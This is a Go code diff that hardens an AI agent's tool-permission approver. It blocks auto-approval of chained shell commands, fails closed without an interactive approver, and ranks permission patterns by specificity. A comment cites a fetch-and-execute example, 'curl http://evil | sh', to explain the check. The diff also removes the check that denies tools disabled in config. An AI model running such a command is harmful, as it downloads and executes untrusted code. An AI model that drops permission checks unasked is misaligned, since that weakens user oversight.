@@ -40,7 +40,6 @@ type approvalAsker interface {
 
 type configuredApprover struct {
 	policy permissionPolicy
-	tools  map[string]bool
 	auto   bool
 	asker  approvalAsker
 }
@@ -113,36 +112,29 @@ func parsePermissionAction(raw string) (permissionAction, error) {
 }
 
 func (a *configuredApprover) Approve(ctx context.Context, req gage.PermissionRequest) (gage.Approval, error) {
-	if a.disabled(req) {
-		return gage.Denied("tool disabled by config"), nil
-	}
 	action := a.resolve(req)
+	// Never auto-approve a shell command that chains, redirects, or expands:
+	// an allow rule like "git status*" must not green-light a compound command
+	// such as "git status; curl http://evil | sh". Downgrade to an explicit ask.
+	if action == permissionAllow && req.Tool == "bash" && hasShellChaining(bashCommand(req)) {
+		action = permissionAsk
+	}
 	switch action {
 	case permissionAllow:
 		return gage.Allowed(), nil
 	case permissionDeny:
 		return gage.Denied("denied by permission config"), nil
 	default:
-		if a.auto || a.asker == nil {
+		if a.auto {
 			return gage.Allowed(), nil
+		}
+		if a.asker == nil {
+			// No interactive approver was wired: fail closed rather than
+			// silently allowing every sensitive call.
+			return gage.Denied("no interactive approver configured"), nil
 		}
 		return a.asker.AskApproval(ctx, req)
 	}
-}
-
-func (a *configuredApprover) disabled(req gage.PermissionRequest) bool {
-	if len(a.tools) == 0 {
-		return false
-	}
-	for _, key := range permissionKeys(req) {
-		if enabled, ok := a.tools[key]; ok && !enabled {
-			return true
-		}
-	}
-	if enabled, ok := a.tools[req.Tool]; ok && !enabled {
-		return true
-	}
-	return false
 }
 
 func (a *configuredApprover) resolve(req gage.PermissionRequest) permissionAction {
@@ -161,21 +153,72 @@ func (a *configuredApprover) resolve(req gage.PermissionRequest) permissionActio
 	return defaultPermission(req)
 }
 
+// Match returns the action of the most specific matching pattern. Specificity
+// is the number of literal (non-wildcard) characters, so "git status*" beats
+// "git*" regardless of config order; ties break toward the more conservative
+// action (deny > ask > allow). This avoids the earlier order-dependent
+// last-match-wins behavior, where map iteration/sorting could let a broad
+// pattern silently override a narrow one.
 func (r permissionRule) Match(target string) (permissionAction, bool) {
-	var matched *permissionAction
+	best := -1
+	var action permissionAction
 	for _, pr := range r.Patterns {
-		if wildcardMatch(pr.Pattern, target) {
-			a := pr.Action
-			matched = &a
+		if !wildcardMatch(pr.Pattern, target) {
+			continue
+		}
+		score := patternSpecificity(pr.Pattern)
+		if score > best || (score == best && actionRank(pr.Action) > actionRank(action)) {
+			best = score
+			action = pr.Action
 		}
 	}
-	if matched != nil {
-		return *matched, true
+	if best >= 0 {
+		return action, true
 	}
 	if r.Action != nil {
 		return *r.Action, true
 	}
 	return "", false
+}
+
+func patternSpecificity(pattern string) int {
+	n := 0
+	for _, r := range pattern {
+		if r != '*' && r != '?' {
+			n++
+		}
+	}
+	return n
+}
+
+func actionRank(a permissionAction) int {
+	switch a {
+	case permissionDeny:
+		return 2
+	case permissionAsk:
+		return 1
+	default:
+		return 0
+	}
+}
+
+// bashCommand extracts the shell command from a bash tool request.
+func bashCommand(req gage.PermissionRequest) string {
+	var f struct {
+		Command string `json:"command"`
+	}
+	_ = json.Unmarshal(req.Input, &f)
+	return f.Command
+}
+
+// hasShellChaining reports whether a command contains shell operators that
+// chain, redirect, or expand into further commands. Such commands must never be
+// auto-approved by a prefix wildcard.
+func hasShellChaining(cmd string) bool {
+	if strings.ContainsAny(cmd, ";|&<>\n\r`") {
+		return true
+	}
+	return strings.Contains(cmd, "$(")
 }
 
 func defaultPermission(req gage.PermissionRequest) permissionAction {
@@ -184,7 +227,10 @@ func defaultPermission(req gage.PermissionRequest) permissionAction {
 		return permissionDeny
 	}
 	m := req.Metadata
-	if m.ReadOnly && m.Filesystem && !m.Network && !m.Destructive {
+	// Auto-allow any read-only, non-destructive, non-network tool (file reads,
+	// todoread, skill, question, ...). Requiring Filesystem here would surprise
+	// the user with prompts for harmless in-memory reads.
+	if m.ReadOnly && !m.Network && !m.Destructive {
 		return permissionAllow
 	}
 	return permissionAsk
